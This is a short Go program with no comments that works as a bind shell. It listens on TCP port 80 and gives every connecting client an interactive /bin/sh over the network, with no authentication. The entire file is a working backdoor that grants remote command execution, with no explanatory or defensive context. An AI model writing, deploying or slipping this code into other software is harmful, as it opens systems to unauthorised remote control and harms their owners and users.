package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func main() {


	port := ":80"
	listener, err := net.Listen("tcp", port)

	if err != nil {
		log.Fatalln("Unable to bind to port: ", err)
		return
	}

	log.Println("Listening on 0.0.0.0")
	for {
		conn, err := listener.Accept()

		if err != nil {
			log.Fatalln("Unable to create connection: ", err)
			continue
		}

		go handle(conn)
	}

}

func handle(conn net.Conn) {

	cmd := exec.Command("/bin/sh", "-i")

	rp, wp := io.Pipe()

	cmd.Stdin = conn

	cmd.Stdout = wp

	go io.Copy(conn, rp)

	cmd.Run()

	conn.Close()
}
